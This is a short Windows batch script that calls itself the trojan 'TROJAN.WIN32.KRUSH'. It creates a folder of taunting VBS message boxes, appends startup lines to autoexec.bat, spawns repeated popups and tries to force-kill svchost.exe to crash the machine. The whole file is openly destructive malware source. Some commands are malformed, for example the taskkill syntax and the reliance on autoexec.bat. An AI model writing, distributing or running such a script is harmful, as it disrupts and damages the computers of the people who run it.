@echo off
echo RUN AS ADMIN FOR BEST RESULTS
pause
cls
echo WARNING: What you just ran is MALWARE! If you don't know what your doing PRESS THE "X" NOW but if you DO know what you're doing...
echo PRESS ANY KEY TO CONTINUE!
pause >nul
cls
cd C:\
md KRUSH
cd C:\KRUSH
echo msgbox "You're FUCKED now!" >> msg1.vbs
echo msgbox "TROJAN.WIN32.KRUSH WRITTEN BY INTERNETPERSON WITH HELP FROM LEONARDO! TRY AND RESTART YOU COMPUTER! ;)" >> msg2.vbs
echo msgbox "Nope." >> msg3.vbs
start C:\KRUSH\msg1.vbs
cls
cd C:\
echo start C:\KRUSH\msg3.vbs >> autoexec.bat
echo TASKKILL /f svchost.exe >> autoexec.bat
cls
start C:\KRUSH\msg2.vbs
start C:\KRUSH\msg2.vbs
start C:\KRUSH\msg2.vbs
start C:\KRUSH\msg2.vbs
start C:\KRUSH\msg2.vbs
start C:\KRUSH\msg2.vbs
TASKKILL /f svchost.exe